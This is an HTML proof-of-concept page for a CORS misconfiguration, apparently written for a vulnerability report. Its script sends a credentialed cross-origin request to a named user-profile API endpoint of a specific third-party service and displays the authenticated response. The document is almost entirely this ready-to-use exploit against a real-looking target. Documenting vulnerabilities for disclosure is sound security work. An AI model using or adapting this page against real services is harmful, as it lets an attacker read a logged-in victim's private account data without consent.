<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS Misconfiguration - Proof of Concept</title>

    <style>
        body {
            margin: 0;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #f4f6f8;
            font-family: Arial, Helvetica, sans-serif;
            color: #222;
        }

        .container {
            width: 650px;
            background: #fff;
            padding: 35px;
            border: 1px solid #d9dfe5;
            border-radius: 8px;
            box-shadow: 0 4px 14px rgba(0, 0, 0, 0.08);
        }

        h1 {
            margin-top: 0;
            font-size: 24px;
        }

        .description {
            color: #555;
            line-height: 1.6;
        }

        button {
            width: 100%;
            padding: 12px;
            border: 0;
            border-radius: 5px;
            background: #1f6feb;
            color: #fff;
            font-size: 15px;
            cursor: pointer;
        }

        button:hover {
            background: #1558b0;
        }

        .status {
            margin-top: 20px;
            padding: 12px;
            background: #f4f6f8;
            border-radius: 5px;
        }

        pre {
            margin-top: 15px;
            padding: 15px;
            background: #1e1e1e;
            color: #fff;
            border-radius: 5px;
            overflow-x: auto;
            white-space: pre-wrap;
            word-break: break-word;
        }
    </style>
</head>

<body>

<div class="container">

    <h1>CORS Misconfiguration - Proof of Concept</h1>

    <p class="description">
        This PoC demonstrates cross-origin access to the affected API endpoint.
        The request is performed using the authenticated browser session.
    </p>

    <button id="pocButton">
        Execute PoC
    </button>

    <div class="status" id="status">
        Status: Waiting for execution
    </div>

    <pre id="response">Response will appear here...</pre>

</div>

<script>
    const targetUrl =
        "https://ocean.medishout.co.uk/v1/users/me/?platform=web";

    document.getElementById("pocButton").addEventListener("click", async function () {

        const status = document.getElementById("status");
        const output = document.getElementById("response");

        status.textContent = "Status: Sending cross-origin request...";

        try {
            const response = await fetch(targetUrl, {
                method: "GET",
                credentials: "include"
            });

            const body = await response.text();

            status.textContent =
                "Status: Response successfully accessed (" +
                response.status +
                ")";

            output.textContent = body;

        } catch (error) {

            status.textContent =
                "Status: Cross-origin response could not be accessed";

            output.textContent =
                "Browser error: " + error.message;
        }
    });
</script>

</body>
</html>
